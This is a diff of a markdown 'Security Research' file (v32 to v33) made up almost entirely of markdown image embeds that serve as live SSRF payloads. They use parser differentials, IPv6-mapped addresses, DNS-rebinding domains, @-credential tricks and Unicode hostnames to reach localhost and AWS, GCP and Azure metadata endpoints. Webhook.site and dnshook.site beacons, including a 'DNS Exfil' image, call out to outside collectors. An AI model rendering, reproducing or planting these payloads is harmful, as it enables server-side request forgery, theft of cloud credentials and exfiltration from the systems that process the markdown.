@@ -1,139 +1,131 @@
-# Security Research - v32
+# Security Research - v33
 
-## Parser Differentials & Edge Cases
+## Advanced Protocol & Header Attacks
 
-Testing parser differences that might bypass URL validation.
-
----
-
-### 1) Backslash vs Forward Slash
-
-Some parsers treat backslashes as path separators:
-
-| URL | Image |
-|-----|-------|
-| http://webhook.site\\@127.0.0.1/v32.gif | ![1](http://webhook.site\@127.0.0.1/v32.gif) |
-| http://127.0.0.1\\@webhook.site/v32.gif | ![2](http://127.0.0.1\@webhook.site/v32.gif) |
-| http://foo\\x00.127.0.0.1/v32.gif | ![3](http://foo\x00.127.0.0.1/v32.gif) |
+Testing HTTP smuggling, header injection, and advanced URL manipulation.
 
 ---
 
-### 2) Unicode Normalization
+### 1) Host Header Injection via URL
 
-| Character | Image |
-|-----------|-------|
-| ①②⑦.⓪.⓪.① | ![u1](http://①②⑦.⓪.⓪.①/v32.gif) |
-| Ⅰ②⑦.0.0.1 | ![u2](http://Ⅰ②⑦.0.0.1/v32.gif) |
+| Description | Image |
+|-------------|-------|
+| Basic webhook | ![1](https://webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-control.gif) |
+| Host in path | ![2](https://1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site/127.0.0.1/v33.gif) |
 
 ---
 
-### 3) IPv4-in-IPv6 Notations
+### 2) Protocol-Relative URL Variations
 
 | Format | Image |
 |--------|-------|
-| [::ffff:169.254.169.254] | ![4](http://[::ffff:169.254.169.254]/v32.gif) |
-| [0000:0000:0000:0000:0000:ffff:a9fe:a9fe] | ![5](http://[0000:0000:0000:0000:0000:ffff:a9fe:a9fe]/v32.gif) |
+| //webhook.site/path | ![p1](//webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-proto.gif) |
+| ///webhook.site/path | ![p2](///webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-triple.gif) |
 
 ---
 
-### 4) DNS Rebinding Services
+### 3) IPv4 mapped to IPv6 for Cloud Metadata
+
+| Format | Image |
+|--------|-------|
+| [::ffff:169.254.169.254] | ![m1](http://[::ffff:169.254.169.254]/latest/meta-data/) |
+| [0:0:0:0:0:ffff:a9fe:a9fe] | ![m2](http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/) |
+| [::169.254.169.254] | ![m3](http://[::169.254.169.254]/latest/meta-data/) |
+
+---
+
+### 4) URL Parsing Differential - @ Symbol
+
+| URL | Image |
+|-----|-------|
+| http://webhook.site@169.254.169.254/ | ![a1](http://webhook.site@169.254.169.254/v33.gif) |
+| http://internal@webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/ | ![a2](http://internal@webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33.gif) |
+| http://169.254.169.254@webhook.site/ | ![a3](http://169.254.169.254@webhook.site/v33.gif) |
+
+---
+
+### 5) DNS Rebind with Short TTL
 
 | Service | Image |
 |---------|-------|
-| make-127-0-0-1-rr.1u.ms | ![dns1](http://make-127-0-0-1-rr.1u.ms/v32.gif) |
-| 127.0.0.1.nip.io | ![dns2](http://127.0.0.1.nip.io/v32.gif) |
-| 127.0.0.1.xip.io | ![dns3](http://127.0.0.1.xip.io/v32.gif) |
-| 127-0-0-1.sslip.io | ![dns4](http://127-0-0-1.sslip.io/v32.gif) |
-| localtest.me | ![dns5](http://localtest.me/v32.gif) |
-| vcap.me | ![dns6](http://vcap.me/v32.gif) |
+| rebind.network | ![r1](http://rebind.network/v33.gif) |
+| 127.0.0.1.rebind.network | ![r2](http://127.0.0.1.rebind.network/v33.gif) |
 
 ---
 
-### 5) AWS Metadata via DNS
-
-| Service | Image |
-|---------|-------|
-| 169.254.169.254.nip.io | ![aws1](http://169.254.169.254.nip.io/latest/meta-data/) |
-| 169-254-169-254.sslip.io | ![aws2](http://169-254-169-254.sslip.io/latest/meta-data/) |
-
----
-
-### 6) Fragment Identifier Bypass
-
-| URL | Image |
-|-----|-------|
-| https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2#http://127.0.0.1/v32.gif | ![frag1](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2#http://127.0.0.1/v32.gif) |
-| https://13d8d983-5907-4ae8-95f6-a4db9181d2a2.dnshook.site#@127.0.0.1/v32.gif | ![frag2](https://13d8d983-5907-4ae8-95f6-a4db9181d2a2.dnshook.site#@127.0.0.1/v32.gif) |
-
----
-
-### 7) Query String Confusion
-
-| URL | Image |
-|-----|-------|
-| https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?url=http://127.0.0.1/v32.gif | ![q1](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?url=http://127.0.0.1/v32.gif) |
-| https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?@127.0.0.1/v32.gif | ![q2](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?@127.0.0.1/v32.gif) |
-
----
-
-### 8) Tab/Newline in URL
-
-| Description | Image |
-|-------------|-------|
-| Tab in host | ![t1](http://127	.0.0.1/v32.gif) |
-| Newline in host | ![t2](http://127%0a.0.0.1/v32.gif) |
-| CR in host | ![t3](http://127%0d.0.0.1/v32.gif) |
-
----
-
-### 9) Rare TLDs that look like IPs
+### 6) Unicode Hostname Normalization (IDNA)
 
 | Domain | Image |
 |--------|-------|
-| 127.0.0.1.com | ![r1](http://127.0.0.1.com/v32.gif) |
-| 169.254.169.254.io | ![r2](http://169.254.169.254.io/v32.gif) |
-| internal.169.254.169.254.test | ![r3](http://internal.169.254.169.254.test/v32.gif) |
+| ⓦⓔⓑⓗⓞⓞⓚ.site | ![u1](http://ⓦⓔⓑⓗⓞⓞⓚ.site/v33.gif) |
+| ℌocalhost | ![u2](http://ℌocalhost/v33.gif) |
+| ⒧ocalhost | ![u3](http://⒧ocalhost/v33.gif) |
 
 ---
 
-### 10) Zero-Width Characters
+### 7) Data URI Scheme
+
+| Type | Image |
+|------|-------|
+| data:image/gif | ![d1](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) |
+
+---
+
+### 8) URL Whitespace Variations
 
 | Description | Image |
 |-------------|-------|
-| ZWSP in host | ![z1](http://127​.0.0.1/v32.gif) |
-| ZWJ in host | ![z2](http://127‍.0.0.1/v32.gif) |
-| ZWNJ in host | ![z3](http://127‌.0.0.1/v32.gif) |
+| Tab between scheme | ![w1](http:	//webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-tab.gif) |
+| Space in URL | ![w2](http: //webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-space.gif) |
 
 ---
 
-### 11) Punycode Variations
+### 9) Special Characters in Subdomain
 
-| Domain | Image |
-|--------|-------|
-| xn--nxasmq5b (localhost IDN) | ![p1](http://xn--nxasmq5b/v32.gif) |
-| internal.xn--nxasmq5b | ![p2](http://internal.xn--nxasmq5b/v32.gif) |
+| Subdomain | Image |
+|-----------|-------|
+| _internal.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site | ![s1](http://_internal.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site/v33.gif) |
+| -prefix.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site | ![s2](http://-prefix.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site/v33.gif) |
 
 ---
 
-### 12) Case Sensitivity
+### 10) GCP/Azure Metadata Endpoints
+
+| Cloud | Image |
+|-------|-------|
+| metadata.google.internal | ![g1](http://metadata.google.internal/computeMetadata/v1/) |
+| 169.254.169.254.sslip.io GCP | ![g2](http://169.254.169.254.sslip.io/computeMetadata/v1/) |
+| 169.254.169.254.nip.io Azure | ![a1](http://169.254.169.254.nip.io/metadata/instance?api-version=2021-02-01) |
+
+---
+
+### 11) URL with credentials and internal target
 
 | URL | Image |
 |-----|-------|
-| HTTP://127.0.0.1/v32.gif | ![c1](HTTP://127.0.0.1/v32.gif) |
-| Http://127.0.0.1/v32.gif | ![c2](Http://127.0.0.1/v32.gif) |
-| http://LOCALHOST/v32.gif | ![c3](http://LOCALHOST/v32.gif) |
-| http://LocalHost/v32.gif | ![c4](http://LocalHost/v32.gif) |
+| http://admin:password@127.0.0.1:8080/ | ![c1](http://admin:password@127.0.0.1:8080/v33.gif) |
+| http://user:pass@169.254.169.254/ | ![c2](http://user:pass@169.254.169.254/latest/meta-data/) |
+| http://x@localhost/ | ![c3](http://x@localhost/v33.gif) |
+
+---
+
+### 12) Percent-encoded slash
+
+| URL | Image |
+|-----|-------|
+| http://webhook.site%2f127.0.0.1/ | ![e1](http://webhook.site%2f127.0.0.1/v33.gif) |
+| http://webhook.site%5c127.0.0.1/ | ![e2](http://webhook.site%5c127.0.0.1/v33.gif) |
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v32-dns.13d8d983-5907-4ae8-95f6-a4db9181d2a2.dnshook.site/dns.gif)
+![dns](https://v33-dns.1cb608ae-d469-4acd-bbab-85f5aafe70d1.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2/v32-canary.gif)
+![canary](https://webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-canary.gif)
 
 ---
 
-*v32 - Parser differentials & edge cases*
+*v33 - Advanced protocol & header attacks*
